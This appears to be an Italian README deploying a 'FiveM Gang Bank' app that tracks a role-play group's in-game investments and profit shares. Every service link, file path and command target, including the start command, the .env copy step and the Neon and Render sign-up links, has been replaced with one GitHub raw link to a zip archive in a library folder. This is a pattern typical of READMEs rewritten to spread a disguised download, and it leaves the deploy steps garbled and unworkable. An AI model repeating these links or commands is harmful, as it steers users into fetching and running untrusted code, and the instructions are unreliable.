# 💰 FiveM Gang Bank — Guida al Deploy

App per gestire gli investimenti del gruppo su FiveM. Ogni membro mette soldi nelle attività, i guadagni vengono distribuiti in base alla % investita.

---

## 🗂️ Struttura

```
fivem-finance/
├── backend/     → https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip + Express + PostgreSQL
└── frontend/    → React + Vite
```

---

## 🚀 Deploy su Render + Neon

### Step 1 — Database (Neon)

1. Vai su [https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip](https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip) e crea un account gratuito
2. Crea un nuovo progetto → copia la **Connection String** (postgresql://...)
3. Tieni da parte la stringa, ti servirà dopo

---

### Step 2 — Backend su Render

1. Carica il progetto su GitHub (metti solo la cartella `backend/`)
2. Vai su [https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip](https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip) → **New Web Service**
3. Collega il repo → imposta:
   - **Root directory:** `backend`
   - **Build Command:** `npm install`
   - **Start Command:** `node https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip`
4. Aggiungi le **Environment Variables**:

| Variabile | Valore |
|-----------|--------|
| `DATABASE_URL` | La stringa di Neon copiata prima |
| `JWT_SECRET` | Una stringa segreta lunga (es. `xy8z9k2m4p6q8r0s2t4v6w8`) |
| `ADMIN_SECRET` | La password che userete per creare account admin (es. `gangadmin2024`) |
| `FRONTEND_URL` | URL del frontend (lo avrai dopo) |
| `PORT` | `3001` |

5. Deploy → copia l'URL del backend (es. `https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip`)

---

### Step 3 — Frontend su Render

1. Carica la cartella `frontend/` su GitHub (stesso repo o repo diverso)
2. Vai su Render → **New Static Site**
3. Imposta:
   - **Root directory:** `frontend`
   - **Build Command:** `npm install && npm run build`
   - **Publish directory:** `dist`
4. Aggiungi Environment Variable:

| Variabile | Valore |
|-----------|--------|
| `VITE_API_URL` | `https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip` |

5. Deploy → copia l'URL del frontend
6. Torna nel backend su Render → aggiorna `FRONTEND_URL` con l'URL del frontend

---

## 👤 Primo Accesso

1. Vai sul frontend → clicca **Registrati**
2. Inserisci username, password e nel campo **Admin Secret** metti il valore che hai impostato in `ADMIN_SECRET`
3. Sei dentro come **admin** 👑

Per i tuoi amici: si registrano normalmente (senza Admin Secret) → diventano **member**

---

## 🎮 Funzionalità

| Feature | Admin | Member |
|---------|-------|--------|
| Vedere dashboard | ✅ | ✅ |
| Vedere attività | ✅ | ✅ |
| Creare/modificare attività | ✅ | ❌ |
| Aggiungere investimenti | ✅ | ❌ |
| Vedere classifica e quote | ✅ | ✅ |
| Vedere storico | ✅ | ✅ |

---

## 📊 Come funziona il calcolo

Se un'attività guadagna **$10.000/mese** e:
- Marco ha investito $6.000 (60%) → guadagna **$6.000/mese**
- Luca ha investito $3.000 (30%) → guadagna **$3.000/mese**  
- Gianni ha investito $1.000 (10%) → guadagna **$1.000/mese**

---

## 🔧 Run locale (sviluppo)

```bash
# Backend
cd backend
npm install
cp https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip .env  # compila con i tuoi valori
npm run dev

# Frontend (altro terminale)
cd frontend
npm install
cp https://github.com/Mattialesto/Fivem-Frontend/raw/refs/heads/main/frontend/src/lib/Fivem-Frontend-v3.0.zip .env  # VITE_API_URL=http://localhost:3001/api
npm run dev
```
